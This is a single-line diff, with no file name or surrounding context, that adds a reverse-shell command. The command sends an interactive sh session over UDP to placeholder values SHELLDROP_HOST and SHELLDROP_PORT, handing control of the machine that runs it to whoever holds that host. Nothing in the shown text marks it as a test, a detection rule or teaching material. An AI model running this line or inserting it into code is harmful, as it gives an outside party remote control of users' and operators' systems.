@@ -1,0 +1,1 @@
+sh -i >& /dev/udp/SHELLDROP_HOST/SHELLDROP_PORT 0>&1
